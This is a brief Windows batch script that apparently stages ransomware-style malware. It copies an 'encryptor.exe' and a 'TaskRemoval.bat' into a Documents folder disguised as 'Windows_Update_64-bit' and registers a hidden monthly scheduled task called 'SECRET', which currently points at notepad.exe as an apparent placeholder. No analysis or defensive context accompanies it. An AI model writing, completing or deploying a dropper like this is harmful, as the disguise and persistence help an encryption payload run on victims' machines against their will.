@echo off
mkdir C:\Users\%USERNAME%\Documents\Windows_Update_64-bit
xcopy /s "encryptor.exe" "C:\Users\%USERNAME%\Documents\Windows_Update_64-bit"
xcopy /s "TaskRemoval.bat" "C:\Users\%USERNAME%\Documents\Windows_Update_64-bit"
SCHTASKS /CREATE /SC MONTHLY /D 30 /TN "WINDOWSTASKS\SECRET" /TR "C:\Windows\System32\notepad.exe" /ST 12:00